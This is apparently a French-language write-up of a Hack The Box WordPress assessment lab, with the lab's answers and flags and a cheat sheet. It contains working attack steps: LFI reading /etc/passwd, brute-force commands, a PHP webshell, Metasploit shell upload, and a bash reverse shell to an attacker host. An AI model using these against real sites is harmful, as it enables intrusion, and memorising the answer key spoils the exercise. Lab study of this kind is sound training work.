| **Réponse à mettre sur HTB** | `twentynineteen` |

**🧭 Procédure**
1. `curl -s http://IP_CIBLE | sed 's/href=/\n/g' | grep 'themes' | cut -d"'" -f2` (page 5).
2. Ou `wpscan --url http://IP_CIBLE` : ligne `WordPress theme in use:`.

---

### ❓ 3 — Flag dans un répertoire en listing ouvert

| | |
|---|---|
| **Réponse à mettre sur HTB** | `HTB{d1sabl3_d1r3ct0ry_l1st1ng!}` |

**🧭 Procédure**
1. Énumère `wp-content/plugins/`, `wp-content/themes/`, `wp-content/uploads/` avec `curl -I` (301 = dossier présent).
2. Pour chaque dossier trouvé, vérifie le listing :
   ```bash
   curl -s http://IP_CIBLE/wp-content/uploads/ | html2text
   ```
3. Cherche un fichier `flag.txt` (ou similaire) dans l'arborescence listée, navigue jusqu'à lui, puis :
   ```bash
   curl -s http://IP_CIBLE/wp-content/uploads/.../flag.txt
   ```

---

### ❓ 4 — Utilisateur non-admin

| | |
|---|---|
| **Réponse à mettre sur HTB** | `Charlie Wiggins` |

**🧭 Procédure**
1. `curl http://IP_CIBLE/wp-json/wp/v2/users | jq` (page 7) ou `wpscan --url http://IP_CIBLE -e u`.
2. Repère le ou les comptes autres que `admin`. Le nom affiché (`name`) correspond au format *Prénom Nom*.

---

### ❓ 5 — Fichier téléchargé via un plugin vulnérable (unauthenticated file download)

| | |
|---|---|
| **Réponse à mettre sur HTB** | `HTB{unauTh_d0wn10ad!}` |

**🧭 Procédure**
1. `wpscan --url http://IP_CIBLE -e vp` pour lister les plugins vulnérables.
2. Cherche un plugin avec une CVE de type « Unauthenticated Arbitrary File Download » (consulte le PoC lié, type exploit-db).
3. Construis la requête du PoC (souvent un paramètre type `?file=` ou `?download=` pointant vers un fichier précis du site), par exemple :
   ```bash
   curl "http://IP_CIBLE/wp-content/plugins/NOM_PLUGIN/CHEMIN_SCRIPT?PARAM=flag.txt"
   ```
4. Adapte le chemin et le nom de fichier exacts d'après le PoC trouvé pour la version du plugin détectée.

---

### ❓ 6 — Version du plugin vulnérable à la LFI

| | |
|---|---|
| **Réponse à mettre sur HTB** | `1.1.1` |

**🧭 Procédure**
1. `wpscan --url http://IP_CIBLE -e vp` : repère le plugin listé avec une CVE **LFI** (Local File Inclusion).
2. Lis la ligne `Version:` juste sous son nom dans la sortie WPScan.
3. Plan B : `curl -s http://IP_CIBLE/wp-content/plugins/NOM_PLUGIN/readme.txt | grep -i "stable tag"`.

---

### ❓ 7 — Utilisateur système commençant par "f" (via LFI)

| | |
|---|---|
| **Réponse à mettre sur HTB** | `frank.mclane` |

**🧭 Procédure**
1. Utilise le chemin LFI du plugin identifié à la question 6 pour lire `/etc/passwd` :
   ```bash
   curl "http://IP_CIBLE/wp-content/plugins/NOM_PLUGIN/CHEMIN_VULNERABLE?pl=/etc/passwd"
   ```
   (adapte `CHEMIN_VULNERABLE` et le nom du paramètre selon le PoC du plugin réellement détecté, ex. Mail Masta → `inc/campaign/count_of_send.php?pl=`).
2. Parcours les lignes du fichier, cherche un login commençant par **f**.

---

### ❓ 8 — Flag final (shell + /home/erika)

| | |
|---|---|
| **Réponse à mettre sur HTB** | `HTB{w0rdPr355_4SS3ssm3n7}` |

**🧭 Procédure complète**

**Partie 1 : obtenir un accès**
1. Avec les informations déjà réunies (utilisateurs, version de plugin vulnérable, éventuels identifiants brute-forcés comme en page 12), cherche à obtenir des **identifiants WordPress admin** valides, ou exploite directement une vulnérabilité d'exécution de code si un plugin le permet (upload de plugin/thème malveillant, ou LFI combinée à un **log poisoning** si un fichier de log est accessible et peut être empoisonné avec du PHP via le **User-Agent** par exemple).
2. Si des identifiants admin sont obtenus : utilise le **Theme Editor** (page 13) pour déposer un webshell PHP (`system($_GET['cmd'])`) dans un thème inactif, ou utilise **Metasploit** (page 14) avec `exploit/unix/webapp/wp_admin_shell_upload` pour automatiser l'obtention d'un reverse shell.

**Partie 2 : stabiliser le shell**
3. Si tu as un webshell GET basique, obtiens un reverse shell complet pour plus de confort :
   ```bash
   # Sur ta machine, écoute :
   nc -lvnp 4444
   # Via le webshell, déclenche un reverse shell bash :
   curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/IP_ATTAQUANT/4444 0>&1'" "http://IP_CIBLE/wp-content/themes/NOM_THEME/404.php"
   ```

**Partie 3 : lire le flag**
4. Une fois dans un shell interactif :
   ```bash
   cat /home/erika/flag.txt
   ```
5. Si l'utilisateur courant (`www-data`) n'a pas les droits de lecture directe, vérifie les permissions (`ls -la /home/erika/`) et envisage une escalade de privilèges locale (hors périmètre de ce module, voir modules dédiés à la privilege escalation Linux).

✔️ **Plan B** : si le shell obtenu via Metasploit tombe en `www-data`, mais que `/home/erika/flag.txt` n'est lisible que par `erika`, chercher d'autres vecteurs (crontab, fichiers SUID, mots de passe réutilisés dans `wp-config.php` pour un compte système identique) pour pivoter vers `erika`.

**Partie 4 : validation**
6. Saisis le contenu exact du flag → **Submit**.

---

# Mémo final — toutes les réponses HTB

| Page | Question | **Réponse à mettre sur HTB** |
|---|---|---|
| 1 à 6 | *(pas de question notée séparément)* | — |
| 7 | Nom d'utilisateur de l'ID 2 (JSON) | *(dépend de la cible)* |
| 8 | *(pas de question)* | — |
| 9 | Nombre de méthodes XML-RPC | *(dépend de la cible)* |
| 10 | Version du plugin "photo-gallery" | *(dépend de la cible)* |
| 11 | Utilisateur non-root avec shell de login | *(dépend de la cible)* |
| 12 | Mot de passe de "roger" (rockyou.txt) | *(dépend de la cible)* |
| 13 | Flag dans `/home/wp-user/flag.txt` | *(dépend de la cible)* |
| 14 | *(démonstration, pas de soumission)* | — |
| 15 | *(pas de question)* | — |
| 16 | Version de WordPress | `5.1.6` |
| 16 | Thème utilisé | `twentynineteen` |
| 16 | Flag directory listing | `HTB{d1sabl3_d1r3ct0ry_l1st1ng!}` |
| 16 | Utilisateur non-admin | `Charlie Wiggins` |
| 16 | Flag unauthenticated file download | `HTB{unauTh_d0wn10ad!}` |
| 16 | Version du plugin vulnérable LFI | `1.1.1` |
| 16 | Utilisateur système commençant par "f" | `frank.mclane` |
| 16 | Flag final (`/home/erika`) | `HTB{w0rdPr355_4SS3ssm3n7}` |

---

# Cheat-sheet du module

## ⌨️ Commandes de base
| Objectif | Commande |
|---|---|
| Version de WordPress (meta tag) | `curl -s http://cible \| grep '<meta name="generator"'` |
| Lister les plugins référencés dans le HTML | `curl -s http://cible \| sed 's/href=/\n/g' \| grep 'wp-content/plugins/*' \| cut -d"'" -f2` |
| Lister les thèmes référencés dans le HTML | `curl -s http://cible \| sed 's/href=/\n/g' \| grep 'themes' \| cut -d"'" -f2` |
| Tester l'existence d'un plugin (actif) | `curl -I -X GET http://cible/wp-content/plugins/NOM_PLUGIN` |
| Lister un dossier en listing ouvert | `curl -s http://cible/CHEMIN/ \| html2text` |
| Énumérer un utilisateur par ID | `curl -s -I http://cible/?author=N` |
| Lister les utilisateurs via l'API REST | `curl http://cible/wp-json/wp/v2/users \| jq` |
| Lister toutes les méthodes XML-RPC | `curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://cible/xmlrpc.php` |
| Tester des identifiants via XML-RPC | `curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>USER</value></param><param><value>PASS</value></param></params></methodCall>" http://cible/xmlrpc.php` |

## ⌨️ WPScan
| Objectif | Commande |
|---|---|
| Aide complète | `wpscan --hh` |
| Scan complet avec token | `wpscan --url http://cible --enumerate --api-token TOKEN` |
| Tous les plugins | `wpscan --url http://cible -e ap` |
| Plugins vulnérables seulement | `wpscan --url http://cible -e vp` |
| Utilisateurs | `wpscan --url http://cible -e u` |
| Brute force XML-RPC | `wpscan --password-attack xmlrpc -t 20 -U user1,user2 -P wordlist.txt --url http://cible` |
| Brute force wp-login | `wpscan --password-attack wp-login -t 20 -U user1,user2 -P wordlist.txt --url http://cible` |

## ⌨️ Metasploit
```text
msfconsole
search wp_admin
use exploit/unix/webapp/wp_admin_shell_upload
set rhosts CIBLE
set username admin
set password MOT_DE_PASSE
set lhost IP_ATTAQUANT
run
```

## 🔑 Webshell minimal (Theme Editor)
```php
system($_GET['cmd']);
```
```bash
curl "http://cible/wp-content/themes/NOM_THEME/404.php?cmd=id"
```

## Rôles WordPress (du plus au moins privilégié)
`Administrator` > `Editor` > `Author` > `Contributor` > `Subscriber`

## Fichiers/dossiers sensibles
| Chemin | Intérêt |
|---|---|
| `wp-config.php` | Identifiants BDD, salts |
| `wp-content/plugins/` | Plugins (vulnérabilités tierces) |
| `wp-content/themes/` | Thèmes (Theme Editor = RCE admin) |
| `wp-content/uploads/` | Fichiers uploadés (souvent en listing ouvert) |
| `xmlrpc.php` | Brute force rapide, `system.listMethods`, `system.multicall` |
| `wp-json/wp/v2/users` | Énumération d'utilisateurs (REST API) |
| `?author=N` | Énumération d'utilisateurs (ancienne méthode) |
